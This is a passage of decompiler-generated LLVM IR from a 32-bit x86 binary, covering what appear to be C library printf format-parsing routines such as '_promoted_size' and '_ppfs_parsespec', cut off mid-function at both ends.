dec_label_pc_8051150.dec_label_pc_8051185.loopexit_crit_edge: ; preds = %dec_label_pc_805114f
  br label %dec_label_pc_8051185.loopexit

dec_label_pc_8051185.loopexit:                    ; preds = %dec_label_pc_8051150.dec_label_pc_8051185.loopexit_crit_edge, %dec_label_pc_80510db
  %v1_8051150.lcssa = phi i32 [ %v1_8051150, %dec_label_pc_8051150.dec_label_pc_8051185.loopexit_crit_edge ], [ %v1_805115017, %dec_label_pc_80510db ]
  br label %dec_label_pc_8051185

dec_label_pc_8051185:                             ; preds = %dec_label_pc_8051185.loopexit, %dec_label_pc_805116e, %dec_label_pc_8051177
  %v10_805118c = phi i32 [ %v1_8051150.lcssa, %dec_label_pc_8051185.loopexit ], [ %v1_8051182, %dec_label_pc_805116e ], [ %v0_8051185.pre, %dec_label_pc_8051177 ]
  %v1_8051185 = add i32 %v10_805118c, 8
  %v2_8051185 = inttoptr i32 %v1_8051185 to i32*
  %v3_8051185 = load i32, i32* %v2_8051185, align 4
  store i32 %v3_8051185, i32* %eax.global-to-local, align 4
  %v2_8051188 = icmp slt i32 %v3_8051185, 0
  %v1_805118a = icmp eq i1 %v2_8051188, false
  br i1 %v1_805118a, label %dec_label_pc_80511a0, label %dec_label_pc_805118c

dec_label_pc_805118c:                             ; preds = %dec_label_pc_8051185
  %v1_805118c = add i32 %v10_805118c, 16
  %v2_805118c = inttoptr i32 %v1_805118c to i32*
  %v3_805118c = load i32, i32* %v2_805118c, align 4
  %v4_805118c = or i32 %v3_805118c, 8
  store i32 %v4_805118c, i32* %v2_805118c, align 4
  %v0_8051190 = load i32, i32* @ecx, align 4
  %v1_8051190 = add i32 %v0_8051190, 16
  %v2_8051190 = inttoptr i32 %v1_8051190 to i32*
  %v3_8051190 = load i32, i32* %v2_8051190, align 4
  %v4_8051190 = and i32 %v3_8051190, -2
  store i32 %v4_8051190, i32* %v2_8051190, align 4
  %v0_8051194 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051194 = sub i32 0, %v0_8051194
  store i32 %v1_8051194, i32* %eax.global-to-local, align 4
  %v1_8051196 = load i32, i32* @ecx, align 4
  %v2_8051196 = add i32 %v1_8051196, 8
  %v3_8051196 = inttoptr i32 %v2_8051196 to i32*
  store i32 %v1_8051194, i32* %v3_8051196, align 4
  %v0_8051199 = load i32, i32* @ecx, align 4
  %v1_8051199 = add i32 %v0_8051199, 20
  %v2_8051199 = inttoptr i32 %v1_8051199 to i32*
  store i32 32, i32* %v2_8051199, align 4
  %v0_80511a2.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80511a0

dec_label_pc_80511a0:                             ; preds = %dec_label_pc_8051185, %dec_label_pc_805118c
  %v0_80511a2 = phi i32 [ %v3_8051185, %dec_label_pc_8051185 ], [ %v0_80511a2.pre, %dec_label_pc_805118c ]
  %v2_80511a0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_80511a0, i32* @ebx, align 4
  ret i32 %v0_80511a2

; uselistorder directives
  uselistorder i32 %v3_805117b, { 1, 0 }
  uselistorder i32 %v3_8051164, { 1, 0 }
  uselistorder i32 %v1_805114f, { 2, 1, 0 }
  uselistorder i32 %v1_8051150, { 1, 2, 0 }
  uselistorder i32 %v3_80510e8, { 1, 0, 2 }
  uselistorder i32* %v2_80510e8, { 1, 2, 3, 4, 5, 0, 6 }
  uselistorder i32 %v1_80510e3, { 1, 0 }
  uselistorder i32 %v6_80510df, { 3, 4, 5, 2, 1, 0, 7, 6, 8 }
  uselistorder i32 %v1_80510df23, { 1, 0 }
  uselistorder i32 %v1_805115017, { 2, 0, 1 }
  uselistorder i1 %v1_805115e, { 1, 0 }
  uselistorder i32* %esi.global-to-local, { 2, 1, 0 }
  uselistorder i32* %edx.global-to-local, { 5, 0, 1, 2, 3, 4, 6, 7, 8, 9 }
  uselistorder i32* %ebx.global-to-local, { 2, 0, 1, 3, 4, 5, 6, 7 }
  uselistorder i32 %arg1, { 1, 0, 2, 3, 4, 5, 8, 7, 6 }
  uselistorder label %dec_label_pc_80511a0, { 1, 0 }
  uselistorder label %dec_label_pc_8051185, { 0, 2, 1 }
  uselistorder label %dec_label_pc_805116e, { 1, 0 }
  uselistorder label %dec_label_pc_805114f, { 1, 0 }
  uselistorder label %dec_label_pc_805114c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805114a, { 1, 0 }
  uselistorder label %dec_label_pc_8051142, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80510df, { 1, 0 }
  uselistorder label %dec_label_pc_80510db, { 1, 0 }
  uselistorder label %dec_label_pc_80510c1, { 1, 0 }
}

define i32 @_promoted_size(i32 %arg1) local_unnamed_addr {
entry:
  %v0_80511a4 = load i32, i32* @eax, align 4
  br label %dec_label_pc_80511ab

dec_label_pc_80511ab:                             ; preds = %dec_label_pc_80511ab, %entry
  %v0_80511ab = phi i32 [ ptrtoint (i8** @global_var_805b5b6.218 to i32), %entry ], [ %v1_80511ab, %dec_label_pc_80511ab ]
  %v1_80511ab = add i32 %v0_80511ab, -2
  %v1_80511ae = inttoptr i32 %v1_80511ab to i16*
  %v2_80511ae = load i16, i16* %v1_80511ae, align 2
  %v3_80511ae = sext i16 %v2_80511ae to i32
  %v12_80511b1 = icmp ne i32 %v3_80511ae, %v0_80511a4
  %v6_80511bb = icmp ugt i32 %v1_80511ab, ptrtoint (i32* @global_var_805b59e.219 to i32)
  %or.cond = and i1 %v6_80511bb, %v12_80511b1
  br i1 %or.cond, label %dec_label_pc_80511ab, label %dec_label_pc_80511bd

dec_label_pc_80511bd:                             ; preds = %dec_label_pc_80511ab
  %.pre = add i32 %v0_80511ab, -134591904
  %v2_80511c3 = sdiv i32 %.pre, 2
  store i32 %v2_80511c3, i32* @edx, align 4
  %v1_80511c5 = add i32 %v2_80511c3, ptrtoint (i8** @global_var_805b5b6.218 to i32)
  %v2_80511c5 = inttoptr i32 %v1_80511c5 to i8*
  %v3_80511c5 = load i8, i8* %v2_80511c5, align 1
  %v4_80511c5 = zext i8 %v3_80511c5 to i32
  ret i32 %v4_80511c5

; uselistorder directives
  uselistorder i32 %v2_80511c3, { 1, 0 }
  uselistorder i32 %v1_80511ab, { 1, 2, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_805b5b6.218 to i32), { 1, 0 }
}

define i32 @_ppfs_parsespec(i32* %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp66 = call i32 @__decompiler_undefined_function_0()
  %tmp76 = ptrtoint i32* %arg1 to i32
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-71 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_80511ce = load i32, i32* @edi, align 4
  %v0_80511cf = load i32, i32* @esi, align 4
  %v0_80511d0 = load i32, i32* @ebx, align 4
  store i32 %v0_80511d0, i32* %stack_var_-16, align 4
  %v4_80511d0 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %tmp76, i32* %eax.global-to-local, align 4
  store i32 %tmp76, i32* %edx.global-to-local, align 4
  %v1_80511fc = add i32 %tmp76, 24
  %v2_80511fc = inttoptr i32 %v1_80511fc to i32*
  %v3_80511fc = load i32, i32* %v2_80511fc, align 4
  store i32 %v3_80511fc, i32* %eax.global-to-local, align 4
  %v1_8051203 = add i32 %tmp76, 16
  %v2_8051203 = inttoptr i32 %v1_8051203 to i32*
  %v3_8051203 = load i32, i32* %v2_8051203, align 4
  %v1_8051206 = and i32 %v3_8051203, 128
  %v2_8051206 = icmp eq i32 %v1_8051206, 0
  store i32 %v1_8051206, i32* %edi.global-to-local, align 4
  %v1_805120c = icmp eq i1 %v2_8051206, false
  br i1 %v1_805120c, label %dec_label_pc_805121f, label %dec_label_pc_805120e

dec_label_pc_805120e:                             ; preds = %entry
  %v2_805120e = load i32, i32* %arg1, align 4
  br label %dec_label_pc_805126c.outer

dec_label_pc_8051219:                             ; preds = %dec_label_pc_80513a7
  %v1_8051219 = add i32 %v0_80513a7.pre.pre, 1
  store i32 %v1_8051219, i32* @esi, align 4
  br label %dec_label_pc_80513b7

dec_label_pc_805121f:                             ; preds = %entry
  %v15_80511d1 = ptrtoint i32* %stack_var_-108 to i32
  store i32 0, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8051221

dec_label_pc_8051221:                             ; preds = %dec_label_pc_8051249.dec_label_pc_8051221_crit_edge, %dec_label_pc_805121f
  %v2_8051232 = phi i32 [ %v2_8051232.pre, %dec_label_pc_8051249.dec_label_pc_8051221_crit_edge ], [ %v15_80511d1, %dec_label_pc_805121f ]
  %v3_8051232 = phi i32 [ %v1_8051249, %dec_label_pc_8051249.dec_label_pc_8051221_crit_edge ], [ 0, %dec_label_pc_805121f ]
  store i32 %tmp76, i32* %eax.global-to-local, align 4
  %v1_8051225 = mul i32 %v3_8051232, 4
  store i32 %v1_8051225, i32* @ecx, align 4
  %v2_805122c = load i32, i32* %arg1, align 4
  store i32 %v2_805122c, i32* @edx, align 4
  %v2_805122e = add i32 %v1_8051225, -4
  %v3_805122e = add i32 %v2_805122e, %v2_805122c
  %v4_805122e = inttoptr i32 %v3_805122e to i32*
  %v5_805122e = load i32, i32* %v4_805122e, align 4
  store i32 %v5_805122e, i32* %eax.global-to-local, align 4
  %v1_8051232 = trunc i32 %v5_805122e to i8
  %v4_8051232 = add i32 %v2_8051232, 36
  %v5_8051232 = add i32 %v4_8051232, %v3_8051232
  %v6_8051232 = inttoptr i32 %v5_8051232 to i8*
  store i8 %v1_8051232, i8* %v6_8051232, align 1
  %v0_8051236 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051236 = urem i32 %v0_8051236, 256
  %v2_8051236 = load i32, i32* @ebx, align 4
  %v3_8051236 = and i32 %v2_8051236, -256
  %v4_8051236 = or i32 %v3_8051236, %v1_8051236
  store i32 %v4_8051236, i32* @ebx, align 4
  %v1_8051238 = mul i32 %v0_8051236, 16777216
  %v2_8051238 = sdiv i32 %v1_8051238, 16777216
  store i32 %v2_8051238, i32* %eax.global-to-local, align 4
  %v1_805123b = load i32, i32* @edx, align 4
  %v2_805123b = load i32, i32* @ecx, align 4
  %v3_805123b = add i32 %v1_805123b, -4
  %v4_805123b = add i32 %v3_805123b, %v2_805123b
  %v5_805123b = inttoptr i32 %v4_805123b to i32*
  %v6_805123b = load i32, i32* %v5_805123b, align 4
  %v17_805123b = icmp eq i32 %v2_8051238, %v6_805123b
  %v1_805123f = icmp eq i1 %v17_805123b, false
  br i1 %v1_805123f, label %dec_label_pc_8051588, label %dec_label_pc_8051245

dec_label_pc_8051245:                             ; preds = %dec_label_pc_8051221
  %v3_8051245 = trunc i32 %v0_8051236 to i8
  %v4_8051245 = icmp eq i8 %v3_8051245, 0
  br i1 %v4_8051245, label %dec_label_pc_805124f, label %dec_label_pc_8051249

dec_label_pc_8051249:                             ; preds = %dec_label_pc_8051245
  %v0_8051249 = load i32, i32* %esi.global-to-local, align 4
  %v1_8051249 = add i32 %v0_8051249, 1
  store i32 %v1_8051249, i32* %esi.global-to-local, align 4
  %tmp154 = icmp ult i32 %v1_8051249, 32
  br i1 %tmp154, label %dec_label_pc_8051249.dec_label_pc_8051221_crit_edge, label %dec_label_pc_805124f

dec_label_pc_8051249.dec_label_pc_8051221_crit_edge: ; preds = %dec_label_pc_8051249
  %v2_8051232.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8051221

dec_label_pc_805124f:                             ; preds = %dec_label_pc_8051249, %dec_label_pc_8051245
  %v2_8051254 = ptrtoint i32* %stack_var_-71 to i32
  br label %dec_label_pc_805126c.outer

dec_label_pc_805126c.outer:                       ; preds = %dec_label_pc_805124f, %dec_label_pc_805120e, %dec_label_pc_8051389
  %v0_8051278.ph94 = phi i32 [ %v1_8051389, %dec_label_pc_8051389 ], [ %v2_805120e, %dec_label_pc_805120e ], [ %v2_8051254, %dec_label_pc_805124f ]
  %stack_var_-32.1.ph = phi i32 [ %stack_var_-32.3, %dec_label_pc_8051389 ], [ %tmp66, %dec_label_pc_805120e ], [ %tmp66, %dec_label_pc_805124f ]
  %stack_var_-96.1.ph = phi i32 [ %v0_8051212, %dec_label_pc_8051389 ], [ 0, %dec_label_pc_805120e ], [ 0, %dec_label_pc_805124f ]
  %stack_var_-88.1.ph = phi i32 [ %stack_var_-88.3, %dec_label_pc_8051389 ], [ %v3_80511fc, %dec_label_pc_805120e ], [ %v3_80511fc, %dec_label_pc_805124f ]
  %stack_var_-92.1.ph = phi i64 [ -1, %dec_label_pc_8051389 ], [ 0, %dec_label_pc_805120e ], [ 0, %dec_label_pc_805124f ]
  %v7_8051273 = mul nsw i64 %stack_var_-92.1.ph, -4
  %v8_8051273 = trunc i64 %v7_8051273 to i32
  %v2_805127b = add i32 %v8_8051273, 80
  br label %dec_label_pc_805126c

dec_label_pc_805126c:                             ; preds = %dec_label_pc_805126c.outer, %dec_label_pc_8051329
  %v0_8051278 = phi i32 [ %v0_8051336, %dec_label_pc_8051329 ], [ %v0_8051278.ph94, %dec_label_pc_805126c.outer ]
  %stack_var_-32.1 = phi i32 [ %stack_var_-32.2, %dec_label_pc_8051329 ], [ %stack_var_-32.1.ph, %dec_label_pc_805126c.outer ]
  %stack_var_-88.1 = phi i32 [ %stack_var_-88.2, %dec_label_pc_8051329 ], [ %stack_var_-88.1.ph, %dec_label_pc_805126c.outer ]
  store i32 %v0_8051278, i32* @edx, align 4
  store i32 %v0_8051278, i32* @esi, align 4
  %v1_805126e = inttoptr i32 %v0_8051278 to i8*
  %v2_805126e = load i8, i8* %v1_805126e, align 1
  %v11_805126e = icmp eq i8 %v2_805126e, 42
  %v1_8051271 = icmp eq i1 %v11_805126e, false
  br i1 %v1_8051271, label %dec_label_pc_8051283, label %dec_label_pc_8051273

dec_label_pc_8051273:                             ; preds = %dec_label_pc_805126c
  store i32 %v8_8051273, i32* %eax.global-to-local, align 4
  %v1_8051278 = add i32 %v0_8051278, 1
  store i32 %v1_8051278, i32* @esi, align 4
  %v0_805127b = load i32, i32* @esp, align 4
  %v3_805127b = add i32 %v2_805127b, %v0_805127b
  %v4_805127b = inttoptr i32 %v3_805127b to i32*
  store i32 0, i32* %v4_805127b, align 4
  %v0_805129d.pre.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8051283

dec_label_pc_8051283:                             ; preds = %dec_label_pc_805126c, %dec_label_pc_8051273
  %v0_805129d.pre = phi i32 [ %v0_8051278, %dec_label_pc_805126c ], [ %v0_805129d.pre.pre, %dec_label_pc_8051273 ]
  store i32 0, i32* %ebx.global-to-local, align 4
  %v0_8051285 = load i32, i32* inttoptr (i32 134621728 to i32*), align 32
  store i32 %v0_8051285, i32* %ebp.global-to-local, align 4
  %v4_805129d.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805129d

dec_label_pc_805128d:                             ; preds = %dec_label_pc_805129d
  %v1_805128d = add i32 %v1_8051295, -4094
  %v6_805128d = sub i32 4093, %v1_8051295
  %v7_805128d = and i32 %v6_805128d, %v1_8051295
  %v8_805128d = icmp slt i32 %v7_805128d, 0
  %v9_805128d = icmp eq i32 %v1_805128d, 0
  %v10_805128d = icmp slt i32 %v1_805128d, 0
  %v3_8051293 = icmp eq i1 %v10_805128d, %v8_805128d
  %v4_8051293 = icmp eq i1 %v9_805128d, false
  %v5_8051293 = and i1 %v4_8051293, %v3_8051293
  br i1 %v5_8051293, label %dec_label_pc_805129c, label %dec_label_pc_8051295

dec_label_pc_8051295:                             ; preds = %dec_label_pc_805128d
  %v3_8051295 = mul i32 %v1_8051295, 10
  store i32 %v3_8051295, i32* %eax.global-to-local, align 4
  %v2_8051298 = add i32 %v3_8051295, -48
  %v3_8051298 = add i32 %v2_8051298, %v2_805129f
  store i32 %v3_8051298, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805129c

dec_label_pc_805129c:                             ; preds = %dec_label_pc_805128d, %dec_label_pc_8051295
  %v0_80512b732 = phi i32 [ %v1_8051295, %dec_label_pc_805128d ], [ %v3_8051298, %dec_label_pc_8051295 ]
  %v4_805129d28 = phi i32 [ %v6_805129d, %dec_label_pc_805128d ], [ %v3_8051295, %dec_label_pc_8051295 ]
  %v1_805129c = add i32 %v0_805129c, 1
  store i32 %v1_805129c, i32* @esi, align 4
  br label %dec_label_pc_805129d

dec_label_pc_805129d:                             ; preds = %dec_label_pc_8051283, %dec_label_pc_805129c
  %v1_8051295 = phi i32 [ 0, %dec_label_pc_8051283 ], [ %v0_80512b732, %dec_label_pc_805129c ]
  %v4_805129d = phi i32 [ %v4_805129d.pre, %dec_label_pc_8051283 ], [ %v4_805129d28, %dec_label_pc_805129c ]
  %v0_805129c = phi i32 [ %v0_805129d.pre, %dec_label_pc_8051283 ], [ %v1_805129c, %dec_label_pc_805129c ]
  %v1_805129d = inttoptr i32 %v0_805129c to i8*
  %v2_805129d = load i8, i8* %v1_805129d, align 1
  %v3_805129d = zext i8 %v2_805129d to i32
  %v5_805129d = and i32 %v4_805129d, -256
  %v6_805129d = or i32 %v3_805129d, %v5_805129d
  store i32 %v6_805129d, i32* %eax.global-to-local, align 4
  %v2_805129f = sext i8 %v2_805129d to i32
  store i32 %v2_805129f, i32* @ecx, align 4
  %v2_80512a2 = mul nsw i32 %v2_805129f, 2
  %v3_80512a2 = add i32 %v2_80512a2, %v0_8051285
  %v4_80512a2 = inttoptr i32 %v3_80512a2 to i8*
  %v5_80512a2 = load i8, i8* %v4_80512a2, align 1
  %v6_80512a2 = and i8 %v5_80512a2, 8
  %v7_80512a2 = icmp eq i8 %v6_80512a2, 0
  %v1_80512a7 = icmp eq i1 %v7_80512a2, false
  br i1 %v1_80512a7, label %dec_label_pc_805128d, label %dec_label_pc_80512a9

dec_label_pc_80512a9:                             ; preds = %dec_label_pc_805129d
  %v0_80512a9 = load i32, i32* @edx, align 4
  %v1_80512a9 = add i32 %v0_80512a9, -1
  %v2_80512a9 = inttoptr i32 %v1_80512a9 to i8*
  %v3_80512a9 = load i8, i8* %v2_80512a9, align 1
  %v12_80512a9 = icmp eq i8 %v3_80512a9, 37
  %v1_80512ad = icmp eq i1 %v12_80512a9, false
  br i1 %v1_80512ad, label %dec_label_pc_8051340, label %dec_label_pc_80512b3

dec_label_pc_80512b3:                             ; preds = %dec_label_pc_80512a9
  %v10_80512b3 = icmp eq i8 %v2_805129d, 36
  %v1_80512b5 = icmp eq i1 %v10_80512b3, false
  br i1 %v1_80512b5, label %dec_label_pc_80512e7, label %dec_label_pc_80512b7

dec_label_pc_80512b7:                             ; preds = %dec_label_pc_80512b3
  %tmp89 = icmp slt i32 %v1_8051295, 1
  br i1 %tmp89, label %dec_label_pc_80512e7, label %dec_label_pc_80512bb

dec_label_pc_80512bb:                             ; preds = %dec_label_pc_80512b7
  %v1_80512bb = add i32 %v0_805129c, 1
  store i32 %v1_80512bb, i32* @edx, align 4
  %v4_80512be = icmp eq i32 %stack_var_-88.1, 0
  br i1 %v4_80512be, label %dec_label_pc_8051588, label %dec_label_pc_80512c9

dec_label_pc_80512c9:                             ; preds = %dec_label_pc_80512bb
  store i32 %stack_var_-88.1, i32* %ecx.global-to-local, align 4
  %v2_80512d1 = sub i32 %v1_8051295, %stack_var_-88.1
  %v8_80512d1 = xor i32 %v1_8051295, %stack_var_-88.1
  %v9_80512d1 = xor i32 %v2_80512d1, %v1_8051295
  %v10_80512d1 = and i32 %v9_80512d1, %v8_80512d1
  %v11_80512d1 = icmp slt i32 %v10_80512d1, 0
  %v12_80512d1 = icmp eq i32 %v2_80512d1, 0
  %v13_80512d1 = icmp slt i32 %v2_80512d1, 0
  %v3_80512d3 = icmp ne i1 %v13_80512d1, %v11_80512d1
  %v4_80512d3 = or i1 %v12_80512d1, %v3_80512d3
  %stack_var_-88.1.v0_80512d5 = select i1 %v4_80512d3, i32 %stack_var_-88.1, i32 %v1_8051295
  br label %dec_label_pc_80512e3

dec_label_pc_80512e3:                             ; preds = %dec_label_pc_80512f7, %dec_label_pc_80512c9, %dec_label_pc_80512fb
  %v0_80512e3 = phi i32 [ %v1_80512bb, %dec_label_pc_80512c9 ], [ %v0_80512a9, %dec_label_pc_80512fb ], [ %v0_80512a9, %dec_label_pc_80512f7 ]
  %stack_var_-32.2 = phi i32 [ %v1_8051295, %dec_label_pc_80512c9 ], [ %stack_var_-32.1, %dec_label_pc_80512fb ], [ %stack_var_-32.1, %dec_label_pc_80512f7 ]
  %stack_var_-88.2 = phi i32 [ %stack_var_-88.1.v0_80512d5, %dec_label_pc_80512c9 ], [ 0, %dec_label_pc_80512fb ], [ 0, %dec_label_pc_80512f7 ]
  store i32 %v0_80512e3, i32* @esi, align 4
  br label %dec_label_pc_805130a

dec_label_pc_80512e7:                             ; preds = %dec_label_pc_80512b7, %dec_label_pc_80512b3
  %tmp90 = icmp slt i32 %stack_var_-88.1, 1
  br i1 %tmp90, label %dec_label_pc_80512f7, label %dec_label_pc_80512ee

dec_label_pc_80512ee:                             ; preds = %dec_label_pc_80512e7
  %v10_80512ee = icmp eq i8 %v2_805129d, 109
  br i1 %v10_80512ee, label %dec_label_pc_8051340, label %dec_label_pc_8051588

dec_label_pc_80512f7:                             ; preds = %dec_label_pc_80512e7
  %tmp = icmp ugt i32 %v0_805129c, %v0_80512a9
  br i1 %tmp, label %dec_label_pc_80512fb, label %dec_label_pc_80512e3

dec_label_pc_80512fb:                             ; preds = %dec_label_pc_80512f7
  %v1_80512fb = inttoptr i32 %v0_80512a9 to i8*
  %v2_80512fb = load i8, i8* %v1_80512fb, align 1
  %v8_80512fb = icmp eq i8 %v2_80512fb, 48
  br i1 %v8_80512fb, label %dec_label_pc_80512e3, label %dec_label_pc_8051340

dec_label_pc_805130a:                             ; preds = %dec_label_pc_805131b, %dec_label_pc_80512e3
  %v0_8051336 = phi i32 [ %v1_805131b, %dec_label_pc_805131b ], [ %v0_80512e3, %dec_label_pc_80512e3 ]
  %v4_805131435 = phi i32 [ %v6_8051314, %dec_label_pc_805131b ], [ %v6_805129d, %dec_label_pc_80512e3 ]
  store i32 ptrtoint ([8 x i8]* @global_var_805b596.222 to i32), i32* %edx.global-to-local, align 4
  %v1_8051317 = inttoptr i32 %v0_8051336 to i8*
  br label %dec_label_pc_8051314

dec_label_pc_8051314:                             ; preds = %dec_label_pc_8051325, %dec_label_pc_805130a
  %v4_8051314 = phi i32 [ %v4_805131435, %dec_label_pc_805130a ], [ %v6_8051314, %dec_label_pc_8051325 ]
  %v0_8051316 = phi i32 [ ptrtoint ([8 x i8]* @global_var_805b596.222 to i32), %dec_label_pc_805130a ], [ %v1_8051316, %dec_label_pc_8051325 ]
  %v0_8051325 = phi i32 [ 1, %dec_label_pc_805130a ], [ %v2_8051325, %dec_label_pc_8051325 ]
  store i32 %v0_8051325, i32* @ecx, align 4
  %v1_8051314 = inttoptr i32 %v0_8051316 to i8*
  %v2_8051314 = load i8, i8* %v1_8051314, align 1
  %v3_8051314 = zext i8 %v2_8051314 to i32
  %v5_8051314 = and i32 %v4_8051314, -256
  %v6_8051314 = or i32 %v3_8051314, %v5_8051314
  store i32 %v6_8051314, i32* %eax.global-to-local, align 4
  %v1_8051316 = add i32 %v0_8051316, 1
  store i32 %v1_8051316, i32* @edx, align 4
  %v2_8051317 = load i8, i8* %v1_8051317, align 1
  %v15_8051317 = icmp eq i8 %v2_8051317, %v2_8051314
  %v1_8051319 = icmp eq i1 %v15_8051317, false
  br i1 %v1_8051319, label %dec_label_pc_8051320, label %dec_label_pc_805131b

dec_label_pc_805131b:                             ; preds = %dec_label_pc_8051314
  %v1_805131b = add i32 %v0_8051336, 1
  store i32 %v1_805131b, i32* @esi, align 4
  %v0_805131c = load i32, i32* %edi.global-to-local, align 4
  %v2_805131c = or i32 %v0_805131c, %v0_8051325
  store i32 %v2_805131c, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_805130a

dec_label_pc_8051320:                             ; preds = %dec_label_pc_8051314
  %v1_8051320 = inttoptr i32 %v1_8051316 to i8*
  %v2_8051320 = load i8, i8* %v1_8051320, align 1
  %v3_8051320 = icmp eq i8 %v2_8051320, 0
  br i1 %v3_8051320, label %dec_label_pc_8051329, label %dec_label_pc_8051325

dec_label_pc_8051325:                             ; preds = %dec_label_pc_8051320
  %v2_8051325 = mul i32 %v0_8051325, 2
  br label %dec_label_pc_8051314

dec_label_pc_8051329:                             ; preds = %dec_label_pc_8051320
  %v0_8051329 = load i32, i32* %edi.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_805132d = udiv i32 %v0_8051329, 2
  %v1_805132d.not = or i32 %v1_805132d, -6
  %v1_8051332 = xor i32 %v1_805132d.not, 5
  store i32 %v1_8051332, i32* %eax.global-to-local, align 4
  %v2_8051334 = and i32 %v1_8051332, %v0_8051329
  store i32 %v2_8051334, i32* %edi.global-to-local, align 4
  %v1_8051336 = add i32 %v0_8051336, -1
  %v2_8051336 = inttoptr i32 %v1_8051336 to i8*
  %v3_8051336 = load i8, i8* %v2_8051336, align 1
  %v12_8051336 = icmp eq i8 %v3_8051336, 37
  %v1_805133a = icmp eq i1 %v12_8051336, false
  br i1 %v1_805133a, label %dec_label_pc_805126c, label %dec_label_pc_8051340

dec_label_pc_8051340:                             ; preds = %dec_label_pc_80512fb, %dec_label_pc_8051329, %dec_label_pc_80512a9, %dec_label_pc_80512ee
  %v0_8051363 = phi i32 [ %v1_8051295, %dec_label_pc_80512ee ], [ %v1_8051295, %dec_label_pc_80512fb ], [ 0, %dec_label_pc_8051329 ], [ %v1_8051295, %dec_label_pc_80512a9 ]
  %v1_805136c = phi i32 [ %v0_805129c, %dec_label_pc_80512ee ], [ %v0_805129c, %dec_label_pc_80512fb ], [ %v0_8051336, %dec_label_pc_8051329 ], [ %v0_805129c, %dec_label_pc_80512a9 ]
  %v0_8051369 = phi i32 [ %v0_80512a9, %dec_label_pc_80512ee ], [ %v0_80512a9, %dec_label_pc_80512fb ], [ %v1_8051316, %dec_label_pc_8051329 ], [ %v0_80512a9, %dec_label_pc_80512a9 ]
  %stack_var_-32.3 = phi i32 [ %stack_var_-32.1, %dec_label_pc_80512ee ], [ %stack_var_-32.1, %dec_label_pc_80512fb ], [ %stack_var_-32.2, %dec_label_pc_8051329 ], [ %stack_var_-32.1, %dec_label_pc_80512a9 ]
  %stack_var_-88.3 = phi i32 [ %stack_var_-88.1, %dec_label_pc_80512ee ], [ 0, %dec_label_pc_80512fb ], [ %stack_var_-88.2, %dec_label_pc_8051329 ], [ %stack_var_-88.1, %dec_label_pc_80512a9 ]
  %v1_8051340 = inttoptr i32 %v0_8051369 to i8*
  %v2_8051340 = load i8, i8* %v1_8051340, align 1
  %v11_8051340 = icmp eq i8 %v2_8051340, 42
  %v1_8051343 = icmp eq i1 %v11_8051340, false
  br i1 %v1_8051343, label %dec_label_pc_8051379, label %dec_label_pc_8051345

dec_label_pc_8051345:                             ; preds = %dec_label_pc_8051340
  %v4_8051345 = icmp eq i32 %stack_var_-88.3, 0
  br i1 %v4_8051345, label %dec_label_pc_8051369, label %dec_label_pc_805134c

dec_label_pc_805134c:                             ; preds = %dec_label_pc_8051345
  %v1_805134c = inttoptr i32 %v1_805136c to i8*
  %v2_805134c = load i8, i8* %v1_805134c, align 1
  %v11_805134c = icmp eq i8 %v2_805134c, 36
  %v1_805134f = icmp eq i1 %v11_805134c, false
  br i1 %v1_805134f, label %dec_label_pc_8051588, label %dec_label_pc_8051355

dec_label_pc_8051355:                             ; preds = %dec_label_pc_805134c
  %tmp91 = icmp slt i32 %v0_8051363, 1
  br i1 %tmp91, label %dec_label_pc_8051588, label %dec_label_pc_805135d

dec_label_pc_805135d:                             ; preds = %dec_label_pc_8051355
  store i32 %v8_8051273, i32* %eax.global-to-local, align 4
  %v1_8051362 = add i32 %v1_805136c, 1
  store i32 %v1_8051362, i32* @esi, align 4
  %v1_8051363 = load i32, i32* @esp, align 4
  %v3_8051363 = add i32 %v8_8051273, 68
  %v4_8051363 = add i32 %v3_8051363, %v1_8051363
  %v5_8051363 = inttoptr i32 %v4_8051363 to i32*
  store i32 %v0_8051363, i32* %v5_8051363, align 4
  %v0_80513a7.pre.pre.pre.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8051374

dec_label_pc_8051369:                             ; preds = %dec_label_pc_8051345
  %v1_8051369 = add i32 %v0_8051369, 1
  store i32 %v1_8051369, i32* %eax.global-to-local, align 4
  %v12_805136c = icmp eq i32 %v1_8051369, %v1_805136c
  %v1_805136e = icmp eq i1 %v12_805136c, false
  br i1 %v1_805136e, label %dec_label_pc_8051588, label %dec_label_pc_8051374

dec_label_pc_8051374:                             ; preds = %dec_label_pc_8051369, %dec_label_pc_805135d
  %v0_80513a7.pre.pre.pre = phi i32 [ %v1_805136c, %dec_label_pc_8051369 ], [ %v0_80513a7.pre.pre.pre.pre, %dec_label_pc_805135d ]
  store i32 -2147483648, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051379

dec_label_pc_8051379:                             ; preds = %dec_label_pc_8051340, %dec_label_pc_8051374
  %v0_80513a7.pre.pre = phi i32 [ %v1_805136c, %dec_label_pc_8051340 ], [ %v0_80513a7.pre.pre.pre, %dec_label_pc_8051374 ]
  %v0_8051212 = phi i32 [ %v0_8051363, %dec_label_pc_8051340 ], [ -2147483648, %dec_label_pc_8051374 ]
  %v4_8051379 = trunc i64 %stack_var_-92.1.ph to i32
  %v5_8051379 = icmp eq i32 %v4_8051379, 0
